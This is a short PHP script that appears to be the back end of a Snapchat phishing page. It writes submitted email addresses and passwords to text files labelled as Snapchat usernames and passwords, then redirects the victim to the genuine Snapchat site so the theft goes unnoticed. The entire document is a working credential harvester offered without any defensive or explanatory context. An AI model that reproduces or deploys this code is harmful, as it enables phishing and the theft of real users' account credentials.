<?php

file_put_contents("usernames.txt", "Snapchat Username : " . $email = $_POST['email'] . "\n", FILE_APPEND);
?>
<?php
file_put_contents("pass.txt", "Snapchat Password : " . $pass = $_POST['pass'] . "\n", FILE_APPEND);
header('Location: https://www.snapchat.com/l/en-gb/');
?>
